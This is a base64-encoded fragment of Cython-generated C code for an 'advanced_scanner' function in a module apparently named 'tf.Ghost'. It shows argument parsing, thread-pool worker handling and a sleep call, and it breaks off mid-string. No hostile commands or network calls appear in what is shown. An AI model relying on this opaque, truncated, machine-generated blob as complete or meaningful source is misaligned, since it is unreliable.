RVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZWxmLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDQzNSwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA0MzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJhZHZhbmNlZF9zY2FubmVyIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJhZHZhbmNlZF9zY2FubmVyIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCA0MzUsIF9fcHl4X0wzX2Vycm9yKSB9CiAgICAgIH0KICAgIH0gZWxzZSBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgIT0gMSkpIHsKICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgIH0gZWxzZSB7CiAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNDM1LCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3Zfc2VsZiA9IHZhbHVlc1swXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiYWR2YW5jZWRfc2Nhbm5lciIsIDEsIDEsIDEsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDQzNSwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soInRmLkdob3N0LmFkdmFuY2VkX3NjYW5uZXIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfMjhhZHZhbmNlZF9zY2FubmVyKF9fcHl4X3NlbGYsIF9fcHl4X3Zfc2VsZik7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ydGZfNUdob3N0XzE2YWR2YW5jZWRfc2Nhbm5lcl8yZ2VuZXJhdG9yMyhfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8xNmFkdmFuY2VkX3NjYW5uZXJfZ2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkgewogIHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7CiAgX19weXhfY3VyX3Njb3BlID0gKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKilfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBOVUxMKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZSkpIHsKICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzRfZ2VuZXhwciAqKVB5X05vbmUpOwogICAgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogICAgX19QWVhfRVJSKDAsIDQ0NSwgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJ0Zl81R2hvc3RfMTZhZHZhbmNlZF9zY2FubmVyXzJnZW5lcmF0b3IzLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pLCAoUHlPYmplY3QgKikgX19weXhfY3VyX3Njb3BlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X2FkdmFuY2VkX3NjYW5uZXJfbG9jYWxzX2dlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCA0NDUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7CiAgICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAgIHJldHVybiAoUHlPYmplY3QgKikgZ2VuOwogIH0KCiAgCiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuYWR2YW5jZWRfc2Nhbm5lci5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19QeXhfREVDUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMnRmXzVHaG9zdF8xNmFkdmFuY2VkX3NjYW5uZXJfMmdlbmVyYXRvcjMoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgCnsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByICpfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF80X2dlbmV4cHIgKilfX3B5eF9nZW5lcmF0b3ItPmNsb3N1cmUpOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMjsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMzsKICBpbnQgX19weXhfdF80OwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIGludCBfX3B5eF90XzY7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfODsKICBpbnQgX19weXhfdF85OwogIGludCBfX3B5eF90XzEwOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApOwogIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHsKICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47CiAgICBjYXNlIDE6IGdvdG8gX19weXhfTDdfcmVzdW1lX2Zyb21feWllbGQ7CiAgICBkZWZhdWx0OiAKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIE5VTEw7CiAgfQogIF9fcHl4X0wzX2ZpcnN0X3J1bjo7CiAgaWYgKHVubGlrZWx5KF9fcHl4X3NlbnRfdmFsdWUgIT0gUHlfTm9uZSkpIHsKICAgIGlmICh1bmxpa2VseShfX3B5eF9zZW50X3ZhbHVlKSkgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImNhbid0IHNlbmQgbm9uLU5vbmUgdmFsdWUgdG8gYSBqdXN0LXN0YXJ0ZWQgZ2VuZXJhdG9yIik7CiAgICBfX1BZWF9FUlIoMCwgNDQ1LCBfX3B5eF9MMV9lcnJvcikKICB9CiAgX19weXhfdF8yID0gMDsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDQ0NSwgX19weXhfTDFfZXJyb3IpIH0KICBfX3B5eF90XzUgPSBfX1B5eF9kaWN0X2l0ZXJhdG9yKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCwgMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ZhbHVlcywgKCZfX3B5eF90XzMpLCAoJl9fcHl4X3RfNCkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX3B5eF90XzEgPSBfX3B5eF90XzU7CiAgX19weXhfdF81ID0gMDsKICB3aGlsZSAoMSkgewogICAgX19weXhfdF82ID0gX19QeXhfZGljdF9pdGVyX25leHQoX19weXhfdF8xLCBfX3B5eF90XzMsICZfX3B5eF90XzIsIE5VTEwsICZfX3B5eF90XzUsIE5VTEwsIF9fcHl4X3RfNCk7CiAgICBpZiAodW5saWtlbHkoX19weXhfdF82ID09IDApKSBicmVhazsKICAgIGlmICh1bmxpa2VseShfX3B5eF90XzYgPT0gLTEpKSBfX1BZWF9FUlIoMCwgNDQ1LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfZnV0dXJlKTsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9mdXR1cmUsIF9fcHl4X3RfNSk7CiAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzUgPSAwOwogICAgX19weXhfdF83ID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2Z1dHVyZTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpOwogICAgX19weXhfdF84ID0gMDsKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb25lLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgxLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NDUsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIH0KICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfOSA8IDApKSkgX19QWVhfRVJSKDAsIDQ0NSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fcHl4X3RfMTAgPSAoIV9fcHl4X3RfOSk7CiAgICBpZiAoX19weXhfdF8xMCkgewogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEpOwogICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE7CiAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICAgIF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8wID0gX19weXhfdF8xOwogICAgICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3RfMSA9IF9fcHl4X3RfMjsKICAgICAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF90XzIgPSBfX3B5eF90XzM7CiAgICAgIF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8zID0gX19weXhfdF80OwogICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICAgICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgICAgIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7CiAgICAgIAogICAgICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IDE7CiAgICAgIHJldHVybiBfX3B5eF9yOwogICAgICBfX3B5eF9MN19yZXN1bWVfZnJvbV95aWVsZDo7CiAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8wOwogICAgICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3RfMCA9IDA7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgICAgX19weXhfdF8yID0gX19weXhfY3VyX3Njb3BlLT5fX3B5eF90XzE7CiAgICAgIF9fcHl4X3RfMyA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfdF8yOwogICAgICBfX3B5eF90XzQgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3RfMzsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDQ0NSwgX19weXhfTDFfZXJyb3IpCiAgICB9CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHsKICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7CiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICB9CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7CiAgI2VuZGlmCiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTsKICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMnRmXzVHaG9zdF8yOGFkdmFuY2VkX3NjYW5uZXIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZikgewogIFB5T2JqZWN0ICpfX3B5eF92X2V4ZWN1dG9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9mdXR1cmVfdG9fd29ya2VyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl93b3JrZXJfaWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2FjdGl2ZV93b3JrZXJzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9mdXR1cmUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9nYl8ydGZfNUdob3N0XzE2YWR2YW5jZWRfc2Nhbm5lcl8yZ2VuZXJhdG9yMyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4XzhnZW5leHByNF9fcHl4X3Zfd2lkID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfOGdlbmV4cHI0X19weXhfdl9mdXR1cmUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzU7CiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzExID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMiA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTM7CiAgUHlfc3NpemVfdCBfX3B5eF90XzE0OwogIFB5X3NzaXplX3QgX19weXhfdF8xNTsKICBpbnQgX19weXhfdF8xNjsKICBpbnQgX19weXhfdF8xNzsKICBpbnQgX19weXhfdF8xODsKICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjAgPSBOVUxMOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImFkdmFuY2VkX3NjYW5uZXIiLCAwKTsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0MzYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2xlZXApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MzYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfNSA9IDE7CiAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgX19weXhfdF8yID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF80KTsKICAgIGFzc2VydChfX3B5eF90XzIpOwogICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgX19weXhfdF81ID0gMDsKICB9CiAgI2VuZGlmCiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzJ9OwogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MzYsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAKICAgewogICAgX19weXhfdF80ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVGhyZWFkUG9vbEV4ZWN1dG9yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDM4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgX19weXhfdF81ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzIpKSkgewogICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpOwogICAgICBhc3NlcnQoX19weXhfdF80KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzIpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8yLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzUgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAxIDogMCldID0ge19fcHl4X3RfNCwgTlVMTH07CiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSK